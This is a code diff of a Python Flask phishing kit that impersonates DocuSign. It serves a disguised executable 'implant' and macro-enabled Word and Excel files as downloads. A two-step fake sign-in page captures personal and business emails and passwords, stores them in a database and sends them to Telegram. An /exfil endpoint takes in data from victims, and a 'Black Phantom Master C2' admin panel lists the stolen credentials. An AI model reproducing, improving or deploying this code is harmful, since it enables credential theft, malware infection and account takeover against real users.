+        .footer{text-align:center;padding:20px;font-size:11px;color:#94a3b8;border-top:1px solid #e2e8f0}
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="card">
+            <div class="header"><h1>📄 Document Viewer</h1><p>Select a format to access your documents</p></div>
+            <div class="body">
+                <div class="file-list">
+                    <a href="/file/exe/REF" class="file-item">
+                        <div class="file-icon">⚙️</div>
+                        <div class="file-info">
+                            <div class="file-name">Secure Document Viewer</div>
+                            <div class="file-desc">Windows Application • Recommended</div>
+                        </div>
+                        <div class="btn-download">Download</div>
+                    </a>
+                    <a href="/file/pdf/REF" class="file-item">
+                        <div class="file-icon">📄</div>
+                        <div class="file-info">
+                            <div class="file-name">PDF Document</div>
+                            <div class="file-desc">Adobe Reader • 2.4 MB</div>
+                        </div>
+                        <div class="btn-download">Download</div>
+                    </a>
+                    <a href="/file/doc/REF" class="file-item">
+                        <div class="file-icon">📝</div>
+                        <div class="file-info">
+                            <div class="file-name">Word Document</div>
+                            <div class="file-desc">Microsoft Word • 1.8 MB</div>
+                        </div>
+                        <div class="btn-download">Download</div>
+                    </a>
+                    <a href="/file/xls/REF" class="file-item">
+                        <div class="file-icon">📊</div>
+                        <div class="file-info">
+                            <div class="file-name">Excel Workbook</div>
+                            <div class="file-desc">Microsoft Excel • 3.2 MB</div>
+                        </div>
+                        <div class="btn-download">Download</div>
+                    </a>
+                </div>
+            </div>
+            <div class="footer">DocuSign Secure Document Delivery</div>
+        </div>
+    </div>
+</body>
+</html>
+"""
+
+def get_download_page(ref):
+    return DOWNLOAD_PAGE.replace('REF', ref)
+
+# ====================================================================
+# FLASK ROUTES
 # ====================================================================
 @app.route('/')
 def index():
     ref = uuid.uuid4().hex[:8].upper()
-    tg(f"PAGE VIEW | IP: {request.remote_addr}")
-    return get_page(ref)
+    return get_landing(ref)
 
-@app.route('/download/exe/<ref>')
-def download_exe(ref):
-    tg(f"EXE DOWNLOAD | IP: {request.remote_addr}")
-    return send_file(io.BytesIO(get_implant()), as_attachment=True, download_name=f'DocuSign_Setup.exe', mimetype='application/x-msdownload')
+@app.route('/go/<ref>')
+def go(ref):
+    """When they click REVIEW AND SIGN - shows download options"""
+    tg(f"📥 DOWNLOAD PAGE VIEWED | Ref: {ref} | IP: {request.remote_addr}")
+    return get_download_page(ref)
 
-@app.route('/download/pdf/<ref>')
-def download_pdf(ref):
-    tg(f"PDF DOWNLOAD | IP: {request.remote_addr}")
-    return send_file(io.BytesIO(generate_pdf(ref)), as_attachment=True, download_name=f'Document.pdf', mimetype='application/pdf')
+@app.route('/auth/<ref>')
+def auth(ref):
+    """When they click Sign In - shows step 1 login"""
+    tg(f"🔐 LOGIN PAGE VIEWED | Ref: {ref} | IP: {request.remote_addr}")
+    return get_login_step1(ref)
 
-@app.route('/download/doc/<ref>')
-def download_doc(ref):
-    tg(f"WORD DOWNLOAD | IP: {request.remote_addr}")
-    return send_file(io.BytesIO(generate_doc(ref)), as_attachment=True, download_name=f'Agreement.docm', mimetype='application/vnd.ms-word.document.macroEnabled.12')
+@app.route('/login/step1/<ref>', methods=['POST'])
+def login_step1(ref):
+    email = request.form.get('email', '')
+    password = request.form.get('password', '')
+    ip = request.headers.get('X-Forwarded-For', request.remote_addr)
+    
+    # Store step 1 data
+    conn = sqlite3.connect(DB_PATH)
+    conn.execute("INSERT INTO creds (email, password, company, ip, step, ts) VALUES (?,?,?,?,?,?)", 
+                (email, password, 'pending', ip, 1, datetime.now().isoformat()))
+    conn.commit()
+    conn.close()
+    
+    tg(f"🔐 STEP 1 - Personal: {email} | {password} | IP: {ip}")
+    
+    # Redirect to step 2 - business email verification
+    return redirect(f'/verify/{ref}')
 
-@app.route('/download/xls/<ref>')
-def download_xls(ref):
-    tg(f"EXCEL DOWNLOAD | IP: {request.remote_addr}")
-    return send_file(io.BytesIO(generate_xls(ref)), as_attachment=True, download_name=f'Report.xlsm', mimetype='application/vnd.ms-excel.sheet.macroEnabled.12')
+@app.route('/verify/<ref>')
+def verify(ref):
+    """Step 2 - asks for business email"""
+    return get_login_step2(ref)
 
-@app.route('/login/<ref>')
-def login_page(ref):
-    return get_login(ref)
-
-@app.route('/login/submit/<ref>', methods=['POST'])
-def login_submit(ref):
+@app.route('/login/step2/<ref>', methods=['POST'])
+def login_step2(ref):
     email = request.form.get('email', '')
     password = request.form.get('password', '')
     ip = request.headers.get('X-Forwarded-For', request.remote_addr)
     company = email.split('@')[-1] if '@' in email else 'unknown'
     
-    tg(f"🔐 LOGIN: {email} | {password} | Company: {company} | IP: {ip}")
-    
+    # Store step 2 data
     conn = sqlite3.connect(DB_PATH)
-    conn.execute("INSERT INTO creds (email, password, company, ip, ts) VALUES (?,?,?,?,?)", 
-                (email, password, company, ip, datetime.now().isoformat()))
+    conn.execute("INSERT INTO creds (email, password, company, ip, step, ts) VALUES (?,?,?,?,?,?)", 
+                (email, password, company, ip, 2, datetime.now().isoformat()))
     conn.commit()
     conn.close()
     
-    return '<html><head><meta http-equiv="refresh" content="2;url=https://www.docusign.com"></head><body style="text-align:center;padding:50px"><h2 style="color:#00b3b0">Sign In Successful</h2><p>Redirecting...</p></body></html>'
+    tg(f"🔐 STEP 2 - Business: {email} | {password} | Company: {company} | IP: {ip}")
+    
+    # Redirect to real DocuSign
+    return redirect('https://www.docusign.com')
+
+@app.route('/file/exe/<ref>')
+def file_exe(ref):
+    tg(f"⚙️ EXE DOWNLOAD | Ref: {ref} | IP: {request.remote_addr}")
+    return send_file(io.BytesIO(get_implant()), as_attachment=True, download_name='DocuSign_Setup.exe', mimetype='application/x-msdownload')
+
+@app.route('/file/pdf/<ref>')
+def file_pdf(ref):
+    tg(f"📄 PDF DOWNLOAD | Ref: {ref} | IP: {request.remote_addr}")
+    return send_file(io.BytesIO(make_pdf()), as_attachment=True, download_name='Document.pdf', mimetype='application/pdf')
+
+@app.route('/file/doc/<ref>')
+def file_doc(ref):
+    tg(f"📝 WORD DOWNLOAD | Ref: {ref} | IP: {request.remote_addr}")
+    return send_file(io.BytesIO(make_doc()), as_attachment=True, download_name='Agreement.docm', mimetype='application/vnd.ms-word.document.macroEnabled.12')
+
+@app.route('/file/xls/<ref>')
+def file_xls(ref):
+    tg(f"📊 EXCEL DOWNLOAD | Ref: {ref} | IP: {request.remote_addr}")
+    return send_file(io.BytesIO(make_xls()), as_attachment=True, download_name='Report.xlsm', mimetype='application/vnd.ms-excel.sheet.macroEnabled.12')
 
 @app.route('/exfil', methods=['POST'])
 def exfil():
     data = request.form.get('data', '')
-    if data and 'HEARTBEAT' not in data:
+    if data:
         tg(f"📡 {data[:500]}")
     return "OK"
 
@@ -696,15 +439,43 @@ def admin():
         session['admin'] = True
     if not session.get('admin'):
         return '<form method="POST"><input type="password" name="p"><button>Login</button></form>'
+    
     conn = sqlite3.connect(DB_PATH)
-    creds = conn.execute("SELECT * FROM creds ORDER BY id DESC").fetchall()
+    creds = conn.execute("SELECT * FROM creds ORDER BY id DESC LIMIT 100").fetchall()
     conn.close()
-    rows = ''.join(f'<tr><td>{c[1]}</td><td style="color:#00b3b0">{c[2]}<td>{c[3]}<td>{c[5][:16]}</tr>' for c in creds)
-    return f'<html><body><h1>Diamond Phantom C2</h1><h2>Credentials: {len(creds)}</h2><table border=1><tr><th>Email</th><th>Password</th><th>Company</th><th>Time</th></tr>{rows}</table><p>URL: {request.host_url}</p></body></html>'
+    
+    rows = ''.join(f'<tr><td style="color:#00ff88">{c[1][:40]}</td><td style="color:#ffd700">{c[2][:40]}</td><td>{c[3]}</td><td>Step {c[5]}</td><td>{c[6][:16]}</td></tr>' for c in creds)
+    
+    return f'''
+    <!DOCTYPE html>
+    <html>
+    <head>
+        <title>Black Phantom Master C2</title>
+        <style>
+            body{{background:#0a0c10;color:white;font-family:monospace;padding:20px}}
+            h1{{color:#ff0040}} h2{{color:#ffd700}}
+            table{{border-collapse:collapse;width:100%}}
+            th,td{{padding:10px;border-bottom:1px solid #333;text-align:left}}
+            th{{color:#ffd700}}
+        </style>
+    </head>
+    <body>
+        <h1>💀 BLACK PHANTOM MASTER C2</h1>
+        <h2>Credentials Captured: {len(creds)}</h2>
+        <p>Step 1 = Personal Email | Step 2 = Business Email</p>
+        <table border="1">
+            <tr><th>Email</th><th>Password</th><th>Company</th><th>Step</th><th>Time</th></tr>
+            {rows}
+        </table>
+        <p>URL: {request.host_url}</p>
+        <p>Status: OPERATIONAL | 2-STEP HARVEST ACTIVE</p>
+    </body>
+    </html>
+    '''
 
 @app.route('/health')
 def health():
-    return {"status": "operational"}
+    return {"status": "operational", "version": "Black Phantom Master 2026", "features": ["2-Step Harvest", "Working Exploits", "Telegram C2"]}
 
 if __name__ == '__main__':
     port = int(os.environ.get('PORT', 5000))
